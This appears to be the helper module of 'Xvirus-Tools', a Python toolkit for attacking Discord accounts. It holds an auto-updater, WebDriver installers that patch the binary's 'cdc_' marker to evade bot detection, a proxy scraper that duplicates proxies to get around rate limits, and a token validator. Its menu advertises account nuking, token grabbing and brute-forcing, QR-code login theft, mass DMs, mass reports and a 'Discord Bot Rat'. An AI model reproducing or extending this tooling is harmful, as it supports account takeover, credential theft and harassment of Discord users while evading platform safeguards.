import os
import re
import io
import sys
import time
import json
import ctypes
import random
import zipfile
import requests
import pkg_resources
import subprocess
import threading
import multiprocessing
import threading
import requests
import keyboard
import base64
import os
import sys
from time import sleep
from colorama import Fore
from zipfile import ZipFile

import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from colorama import Fore
from time import sleep

from distutils.version import LooseVersion
from urllib.request import urlopen, urlretrieve
from bs4 import BeautifulSoup
from colorama import Fore
from time import sleep

def CHANGE_LOG():
    input(f'''
    1. Fixed some spelling stuff
    2. Added a gpt option (ai) to use (Thanks to Benajamin)
    3. Startup logo color changer (WIP)
    4. Extrenal proxy scraper that saved porxies as a JSON file
    5. Chnaged water theme to Aqua
    6. Fixed Qr code grabber
    7. Moving auto update for a smoother performance''')



THIS_VERSION = "1.5.7"
TARGET_VERSION = 0


def search_for_updates():
    clear()
    setTitle("Xvirus Checking For Updates. . .")
    r = requests.get("https://github.com/Xvirus0/Xvirus-Tools/releases/latest")

    soup = str(BeautifulSoup(r.text, "html.parser"))
    s1 = re.search("<title>", soup)
    s2 = re.search("·", soup)
    result_string = soup[s1.end() : s2.start()]

    if THIS_VERSION not in result_string:
        setTitle("New Update Found!")
        print(
            f"""{Fore.YELLOW}
                ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗  ██╗
                ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝  ██║
                ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗    ██║
                ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝    ╚═╝
                ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗  ██╗
                ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  ╚═╝
                              {Fore.RED}Looks like Xvirus {THIS_VERSION} is outdated """.replace(
                "█", f"{Fore.WHITE}█{Fore.RED}"
            ),
            end="\n\n",
        )
        soup = BeautifulSoup(
            requests.get(
                "https://github.com/Xvirus0/Xvirus-Tools/releases"
            ).text,
            "html.parser",
        )
        for link in soup.find_all("a"):
            if "releases/download" in str(link):
                update_url = f"https://github.com/{link.get('href')}"
        choice = input(
            f"{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Do you want to update to the latest version? (Y to update N to continue using this version): {Fore.RED}"
        )

        if choice.lower() == "y" or choice.lower() == "yes":
            print(f"{Fore.WHITE}\nUpdating. . .")
            setTitle(f"Xvirus Updating...")
            # if they are running xvirus.exe
            if os.path.basename(sys.argv[0]).endswith("exe"):
                with open("Xvirus-Tools.zip", "wb") as zipfile:
                    zipfile.write(requests.get(update_url).content)
                with ZipFile("Xvirus-Tools.zip", "r") as filezip:
                    filezip.extractall()
                os.remove("Xvirus-Tools.zip")
                cwd = os.getcwd() + "\\Xvirus-Tools\\"
                shutil.copyfile(cwd + "README.md", "README.md")
                try:
                    shutil.copyfile(
                        cwd + os.path.basename(sys.argv[0]), "Xvirus-Tools.exe"
                    )
                except Exception:
                    pass
                shutil.rmtree("Xvirus-Tools")
                setTitle("Xvirus Update Complete!")
                print(f"{Fore.GREEN}Update Successfully Finished!")
                sleep(2)
                os.startfile("Xvirus-Tools.exe")
                os._exit(0)
            # if they are running xvirus source code
            else:
                new_version_source = requests.get(
                    "https://github.com/Xvirus0/Xvirus-Tools/archive/refs/heads/main.zip"
                )
                with open("Xvirus-Tools-main.zip", "wb") as zipfile:
                    zipfile.write(new_version_source.content)
                with ZipFile("Xvirus-Tools-main.zip", "r") as filezip:
                    filezip.extractall()
                os.remove("Xvirus-Tools-main.zip")
                cwd = os.getcwd() + "\\Xvirus-Tools-main"
                shutil.copytree(cwd, os.getcwd(), dirs_exist_ok=True)
                shutil.rmtree(cwd)
                setTitle("Xvirus Update Complete!")
                print(f"{Fore.GREEN}Update Successfully Finished!")
                sleep(2)
                if os.path.exists(os.getcwd() + "setup.bat"):
                    os.startfile("setup.bat")
                elif os.path.exists(os.getcwd() + "start.bat"):
                    os.startfile("start.bat")
                os._exit(0)

class Chrome_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://chromedriver.storage.googleapis.com/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if TARGET_VERSION:
            self.target_version = TARGET_VERSION

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "chromedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_chromedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open(self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect


    def get_release_version_number(self):
        path = (
            "LATEST_RELEASE"
            if not self.target_version
            else f"LATEST_RELEASE_{self.target_version}"
        )
        return LooseVersion(urlopen(self.__class__.DL_BASE + path).read().decode())

    def fetch_chromedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract(self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

class Edge_Installer(object):
    installed = False
    target_version = None
    DL_BASE = "https://msedgedriver.azureedge.net/"

    def __init__(self, executable_path=None, target_version=None, *args, **kwargs):
        self.platform = sys.platform

        if TARGET_VERSION:
            self.target_version = TARGET_VERSION

        if target_version:
            self.target_version = target_version

        if not self.target_version:
            self.target_version = self.get_release_version_number().version[0]

        self._base = base_ = "edgedriver{}"

        exe_name = self._base
        if self.platform in ("win32",):
            exe_name = base_.format(".exe")
        if self.platform in ("linux",):
            self.platform += "64"
            exe_name = exe_name.format("")
        if self.platform in ("darwin",):
            self.platform = "mac64"
            exe_name = exe_name.format("")
        self.executable_path = executable_path or exe_name
        self._exe_name = exe_name

        if not os.path.exists(self.executable_path):
            self.fetch_edgedriver()
            if not self.__class__.installed:
                if self.patch_binary():
                    self.__class__.installed = True

    @staticmethod
    def random_cdc():
        cdc = random.choices('abcdefghijklmnopqrstuvwxyz', k=26)
        cdc[-6:-4] = map(str.upper, cdc[-6:-4])
        cdc[2] = cdc[0]
        cdc[3] = "_"
        return "".join(cdc).encode()

    def patch_binary(self):
        linect = 0
        replacement = self.random_cdc()
        with io.open("ms"+self.executable_path, "r+b") as fh:
            for line in iter(lambda: fh.readline(), b""):
                if b"cdc_" in line:
                    fh.seek(-len(line), 1)
                    newline = re.sub(b"cdc_.{22}", replacement, line)
                    fh.write(newline)
                    linect += 1
            return linect


    def get_release_version_number(self):
        path = (
            "LATEST_STABLE"
            if not self.target_version
            else f"LATEST_RELEASE_{str(self.target_version).split('.', 1)[0]}"
        )
        urlretrieve(
            f"{self.__class__.DL_BASE}{path}",
            filename=f"{os.getenv('temp')}\\{path}",
        )
        with open(f"{os.getenv('temp')}\\{path}", "r+") as f:
            _file = f.read().strip("\n")
            content = ""
            for char in [x for x in _file]:
                for num in ("0","1","2","3","4","5","6","7","8","9","."):
                    if char == num:
                        content += char
        return LooseVersion(content)

    def fetch_edgedriver(self):
        base_ = self._base
        zip_name = base_.format(".zip")
        ver = self.get_release_version_number().vstring
        if os.path.exists(self.executable_path):
            return self.executable_path
        print(f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip")
        urlretrieve(
            f"{self.__class__.DL_BASE}{ver}/{base_.format(f'_{self.platform}')}.zip",
            filename=zip_name,
        )
        with zipfile.ZipFile(zip_name) as zf:
            zf.extract("ms"+self._exe_name)
        os.remove(zip_name)
        if sys.platform != "win32":
            os.chmod(self._exe_name, 0o755)
        return self._exe_name

#NOT FINISHED
class Opera_Installer(object):
    _os_bit = 64
    def __init__(self, *args, **kwargs):
        if os.environ.get('PROCESSOR_ARCHITECTURE').lower() == 'x86' and os.environ.get('PROCESSOR_ARCHITEW6432') is None: 
            self.__class__._os_bit = 32
            
        r = requests.get("https://github.com/operasoftware/operachromiumdriver/releases")
        soup = str(BeautifulSoup(r.text, 'html.parser'))
        print(soup.get_text())

def get_driver():
    #supported drivers
    drivers = ["chromedriver.exe", "msedgedriver.exe"] #"operadriver.exe",

    print(f"\n{Fore.BLUE}Checking Driver. . .")
    sleep(0.5)

    for driver in drivers:
        #Checking if driver already exists
        if os.path.exists(os.getcwd() + os.sep + driver):
            print(f"{Fore.GREEN}{driver} already exists, continuing. . .{Fore.RESET}")
            sleep(0.5)
            return driver
    else:
        print(f"{Fore.RED}Driver not found! Installing it for you")
        #get installed browsers + install driver + return correct driver
        if os.path.exists(os.getenv('localappdata') + '\\Google'):
            Chrome_Installer()
            print(f"{Fore.GREEN}chromedriver.exe Installed!{Fore.RESET}")
            return "chromedriver.exe"
        # elif os.path.exists(os.getenv('appdata') + '\\Opera Software\\Opera Stable'):
            # Opera_Installer()
            #print(f"{Fore.GREEN}operadriver.exe Installed!{Fore.RESET}")
            # return "operadriver.exe"
        elif os.path.exists(os.getenv('localappdata') + '\\Microsoft\\Edge'):
            Edge_Installer()
            print(f"{Fore.GREEN}msedgedriver.exe Installed!{Fore.RESET}")
            return "msedgedriver.exe"
        else:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : No compatible driver found. . . Proceeding with chromedriver')
            Chrome_Installer()
            print(f"{Fore.GREEN}trying to install chromedriver.exe{Fore.RESET}")
            return "chromedriver.exe"

def clear():
    system = os.name
    if system == 'nt':
        #if its windows
        os.system('cls')
    elif system == 'posix':
        #if its linux
        os.system('clear')
    else:
        print('\n'*120)
    return

def setTitle(_str):
    system = os.name
    if system == 'nt':
        #if its windows
        ctypes.windll.kernel32.SetConsoleTitleW(f"{_str} | Made By Xvirus")
    elif system == 'posix':
        #if its linux
        os.system(f"\033]0;{_str} | Made By Xvirus\a", end='', flush=True)
    else:
        #if its something else or some err happend for some reason, we do nothing
        pass

def random_chinese(amount, second_amount):
    name = u''
    for i in range(random.randint(amount, second_amount)):
        name = name + chr(random.randint(0x4E00,0x8000))
    return name

def print_slow(_str):
    for letter in _str:
        #slowly print out the words 
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def install_lib(dependencies):
    #check for missing libs
    installed_packages = sorted([i.key for i in pkg_resources.working_set])
    for lib in dependencies:
        if lib not in installed_packages:
            #install the lib if it wasn't found
            print(f"{Fore.BLUE}{lib}{Fore.RED} not found! Installing it for you. . .{Fore.RESET}")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])
            #incase something goes wrong we notify the user that something happend
            except Exception as e:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : {e}')
                sleep(0.5)
                pass

def validateToken(token):
    #contact discord api and see if you can get a valid response with the given token
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    if r.status_code == 200:
        #it is a valid token
        pass
    else:
        #token is invalid
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1)
        __import__("Xvirus").main()

def validateWebhook(hook):
    try:
        #try and get a connection with the input
        responce = requests.get(hook)
    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.ConnectionError):
        #connection failed
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        sleep(1)
        __import__("Xvirus").main()
    try:
        #try and get a value from object
        j = responce.json()["name"]
    except (KeyError, json.decoder.JSONDecodeError):
        #if its a valid link but link isn't a webhook
        print(f"\n{Fore.RED}Invalid Webhook.{Fore.RESET}")
        sleep(1)
        __import__("Xvirus").main()
    #webhook is valid
    print(f"{Fore.GREEN}Valid webhook! ({j})")

def proxy_scrape(): 
    proxieslog = []
    setTitle("Scraping Proxies")
    #start timer
    startTime = time.time()
    #create temp dir
    temp = os.getenv("temp")+"\\xvirus_proxies"
    #banner
    Anime.Fade((logo), (COLOR_FADE), Colorate.Vertical, time=5)
    
    def fetchProxies(url, custom_regex):
        global proxylist
        try:
            proxylist = requests.get(url, timeout=5).text
        except Exception:
            pass
        finally:
            proxylist = proxylist.replace('null', '')
        #get the proxies from all the sites with the custom regex
        custom_regex = custom_regex.replace('%ip%', '([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})')
        custom_regex = custom_regex.replace('%port%', '([0-9]{1,5})')
        for proxy in re.findall(re.compile(custom_regex), proxylist):
            proxieslog.append(f"{proxy[0]}:{proxy[1]}")

    #all urls
    proxysources = [
        ["http://spys.me/proxy.txt","%ip%:%port% "],
        ["http://www.httptunnel.ge/ProxyListForFree.aspx"," target=\"_new\">%ip%:%port%</a>"],
        ["https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json", "\"ip\":\"%ip%\",\"port\":\"%port%\","],
        ["https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", '"host": "%ip%".*?"country": "(.*?){2}",.*?"port": %port%'],
        ["https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", '%ip%:%port% (.*?){2}-.-S \\+'],
        ["https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt", '%ip%", "type": "http", "port": %port%'],
        ["https://www.us-proxy.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://free-proxy-list.net/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://www.sslproxies.org/", "<tr><td>%ip%<\\/td><td>%port%<\\/td><td>(.*?){2}<\\/td><td class='hm'>.*?<\\/td><td>.*?<\\/td><td class='hm'>.*?<\\/td><td class='hx'>(.*?)<\\/td><td class='hm'>.*?<\\/td><\\/tr>"],
        ["https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=6000&country=all&ssl=yes&anonymity=all", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt", "%ip%:%port%"],
        ["https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt", "%ip%:%port%"],
        ["https://proxylist.icu/proxy/", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/1", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/2", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/3", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/4", "<td>%ip%:%port%</td><td>http<"],
        ["https://proxylist.icu/proxy/5", "<td>%ip%:%port%</td><td>http<"],
        ["https://www.hide-my-ip.com/proxylist.shtml", '"i":"%ip%","p":"%port%",'],
        ["https://raw.githubusercontent.com/scidam/proxy-list/master/proxy.json", '"ip": "%ip%",\n.*?"port": "%port%",']
    ]
    threads = [] 
    for url in proxysources:
        #send them out in threads
        t = threading.Thread(target=fetchProxies, args=(url[0], url[1]))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    proxies = list(set(proxieslog))
    with open(temp, "w") as f:
        for proxy in proxies:
            #create the same proxy 7-10 times to avoid ratelimit when using other options
            for i in range(random.randint(7, 10)):
                f.write(f"{proxy}\n")
    #get the time it took to scrape
    execution_time = (time.time() - startTime)
    print(f"{Fore.GREEN}Done! Scraped{Fore.MAGENTA}{len(proxies): >5}{Fore.GREEN} in total => {Fore.RED}{temp}{Fore.RESET} | {execution_time}ms")
    setTitle(f"Xvirus {THIS_VERSION}")

def proxy():
    temp = os.getenv("temp")+"\\xvirus_proxies"
    #if the file size is empty
    if os.stat(temp).st_size == 0:
        proxy_scrape()
    proxies = open(temp).read().split('\n')
    proxy = proxies[0]

    with open(temp, 'r+') as fp:
        #read all lines
        lines = fp.readlines()
        #get the first line
        fp.seek(0)
        #remove the proxy
        fp.truncate()
        fp.writelines(lines[1:])
    return proxy

#headers for optimazation
heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

                                                            #FADE TYPES#
########################################################################################################################################################
def blackwhite(text):
    os.system(""); faded = ""
    red = 0; green = 0; blue = 0
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};{green};{blue}m{line}\033[0m\n")
        if not red == 255 and not green == 255 and not blue == 255:
            red += 20; green += 20; blue += 20
            if red > 255 and green > 255 and blue > 255:
                red = 255; green = 255; blue = 255
    return faded

def purplepink(text):
    os.system(""); faded = ""
    red = 40
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

def greenblue(text):
    os.system(""); faded = ""
    blue = 100
    for line in text.splitlines():
        faded += (f"\033[38;2;0;255;{blue}m{line}\033[0m\n")
        if not blue == 255:
            blue += 15
            if blue > 255:
                blue = 255
    return faded

def pinkred(text):
    os.system(""); faded = ""
    blue = 255
    for line in text.splitlines():
        faded += (f"\033[38;2;255;0;{blue}m{line}\033[0m\n")
        if not blue == 0:
            blue -= 20
            if blue < 0:
                blue = 0
    return faded

def purpleblue(text):
    os.system(""); faded = ""
    red = 110
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;255m{line}\033[0m\n")
        if not red == 0:
            red -= 15
            if red < 0:
                red = 0
    return faded

def aqua(text):
    os.system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

def fire(text):
    os.system(""); faded = ""
    green = 250
    for line in text.splitlines():
        faded += (f"\033[38;2;255;{green};0m{line}\033[0m\n")
        if not green == 0:
            green -= 25
            if green < 0:
                green = 0
    return faded
########################################################################################################################################################

def getTheme():
    themes = ["xeme", "dark", "fire", "aqua", "neon"]
    with open(os.getenv("temp")+"\\xvirus_theme", 'r') as f:
        text = f.read()
        if not any(s in text for s in themes):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid theme was given, Switching to default. . .')
            setTheme('xeme')
            sleep(2.5)
            __import__("Xvirus").main()
        return text

def setTheme(new: str):
    with open(os.getenv("temp")+"\\xvirus_theme", 'w'): pass
    with open(os.getenv("temp")+"\\xvirus_theme", 'w') as f:
        f.write(new)

def banner(theme=None):
    if theme == "dark":
        print(bannerTheme(blackwhite, blackwhite))
    elif theme == "fire":
        print(bannerTheme(fire, fire))
    elif theme == "aqua":
        print(bannerTheme(aqua, greenblue))
    elif theme == "neon":
        print(bannerTheme(pinkred, purpleblue))
    else:
       print(f'''{Fore.RED}


    
                                        ,.   (   .      )        .      "
                                       ("     )  )'     ,'        )  . (`     '`
                                     .; )  ' (( (" )    ;(,     ((  (  ;)  "  )"
                                     _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( '..
                                    ██╗  ██╗██╗   ██╗██╗██████╗ ██╗   ██╗ ██████╗   
                                    ╚██╗██╔╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
                                     ╚███╔╝ ╚██╗ ██╔╝██║██████╔╝██║   ██║╚█████╗ 
                                     ██╔██╗  ╚████╔╝ ██║██╔══██╗██║   ██║ ╚═══██╗
                                    ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
> Made by Xvirus™                   ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  
> [?] {THIS_VERSION} Changelog                                                                    
> [!] Settings                                                                                   (WIP) Xside gpt [ai] <'''.replace('█', f'{Fore.WHITE}█{Fore.RED}') + f'''   
{Fore.WHITE}───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RED}
{Fore.RED}[{Fore.RED}01{Fore.RED}]{Fore.LIGHTBLACK_EX} Nuke Account                                |{Fore.RED}[{Fore.RED}10{Fore.RED}]{Fore.LIGHTBLACK_EX} Block Friends          |{Fore.RED}[{Fore.RED}19{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Disabler (WIP)
{Fore.RED}[{Fore.RED}02{Fore.RED}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RED}[{Fore.RED}11{Fore.RED}]{Fore.LIGHTBLACK_EX} Profile Changer        |{Fore.RED}[{Fore.RED}20{Fore.RED}]{Fore.LIGHTBLACK_EX} Discord Bot Rat 
{Fore.RED}[{Fore.RED}03{Fore.RED}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RED}[{Fore.RED}12{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Brute-Force      |{Fore.RED}[{Fore.RED}21{Fore.RED}]{Fore.LIGHTBLACK_EX} Vanity Sniper (WIP)
{Fore.RED}[{Fore.RED}04{Fore.RED}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RED}[{Fore.RED}13{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Grabber          |{Fore.RED}[{Fore.RED}22{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Deleter
{Fore.RED}[{Fore.RED}05{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RED}[{Fore.RED}14{Fore.RED}]{Fore.LIGHTBLACK_EX} QR Code grabber        |{Fore.RED}[{Fore.RED}23{Fore.RED}]{Fore.LIGHTBLACK_EX} Proxy Scraper
{Fore.RED}[{Fore.RED}06{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RED}[{Fore.RED}15{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Report            |{Fore.RED}[{Fore.RED}24{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
{Fore.RED}[{Fore.RED}07{Fore.RED}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RED}[{Fore.RED}16{Fore.RED}]{Fore.LIGHTBLACK_EX} GroupChat Spammer      |{Fore.RED}[{Fore.RED}25{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
{Fore.RED}[{Fore.RED}08{Fore.RED}]{Fore.LIGHTBLACK_EX} Get information from a targetted account    |{Fore.RED}[{Fore.RED}17{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Destroyer      |{Fore.RED}[{Fore.RED}26{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
{Fore.RED}[{Fore.RED}09{Fore.RED}]{Fore.LIGHTBLACK_EX} Log into an account                         |{Fore.RED}[{Fore.RED}18{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Mass Validator   |{Fore.RED}[{Fore.RED}27{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
{Fore.WHITE}───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')

def bannerTheme(type1, type2):
    return type1(f'''


    
                                        ,.   (   .      )        .      "
                                       ("     )  )'     ,'        )  . (`     '`
                                     .; )  ' (( (" )    ;(,     ((  (  ;)  "  )"
                                     _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( '..
                                    ██╗  ██╗██╗   ██╗██╗██████╗ ██╗   ██╗ ██████╗   
                                    ╚██╗██╔╝██║   ██║██║██╔══██╗██║   ██║██╔════╝
                                     ╚███╔╝ ╚██╗ ██╔╝██║██████╔╝██║   ██║╚█████╗ 
                                     ██╔██╗  ╚████╔╝ ██║██╔══██╗██║   ██║ ╚═══██╗
                                    ██╔╝╚██╗  ╚██╔╝  ██║██║  ██║╚██████╔╝██████╔╝
> Made by Xvirus™                   ╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  
> [?] {THIS_VERSION} Changelog
> [!] Settings                                                                                   (WIP) Xside gpt [ai] <''')+type2('''  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[01] Nuke Account                                |[10] Block Friends                 |[19] Token Disabler (WIP)
[02] Unfriend all friends                        |[11] Profile Changer               |[20] Discord Bot Rat 
[03] Delete and leave all servers                |[12] Token Brute-Force             |[21] Vanity Sniper (WIP)
[04] Spam Create New servers                     |[13] Token Grabber                 |[22] Webhook Deleter
[05] Dm Deleter                                  |[14] QR Code grabber               |[23] Proxy Scraper
[06] Mass Dm                                     |[15] Mass Report                   |[24] [Coming Soon]
[07] Enable Seizure Mode                         |[16] GroupChat Spammer             |[25] [Coming Soon]
[08] Get information from a targetted account    |[17] Webhook Destroyer             |[26] [Coming Soon]
[09] Log into an account                         |[18] Token Mass Validator          |[27] [Coming Soon]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────''')

logo = r"""
Please wait while Xvirus Scrapes proxies for you!











                                                        ██╗  ██╗
                                                        ╚██╗██╔╝
                                                         ╚███╔╝ 
                                                         ██╔██╗ 
                                                        ██╔╝╚██╗
                                                        ╚═╝  ╚═╝





"""[1:]
def colorlogo():
    print (f'''       
██╗  ██╗ All Colors:
╚██╗██╔╝ blue, black, cyan,
 ╚███╔╝  green, purple, red and white
 ██╔██╗
██╔╝╚██╗    
╚═╝  ╚═╝ Template: Colors.COLOR_to_COLOR


         Example: Colors.black_to_red''')

Xlogo = r"""
Please wait while Xvirus Scrapes proxies for you!











                                                        ██╗  ██╗
                                                        ╚██╗██╔╝
                                                         ╚███╔╝ 
                                                         ██╔██╗ 
                                                        ██╔╝╚██╗
                                                        ╚═╝  ╚═╝











All the scraped proxies will be saved in xproxy_proxies.json
"""[1:]

COLOR_FADE = Colors.red_to_black
def logocolorchanger():
            colorlogo()
            try:
                logocolor = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] {Fore.RED}Input The Color You Desire: {Fore.RED}')
                sleep(1.5)
                colorlogo()
            finally:
                COLOR_FADE = logocolor
            print_slow(f"{Fore.RED}Color set to {Fore.RED}{COLOR_FADE}")
            sleep(0.5)
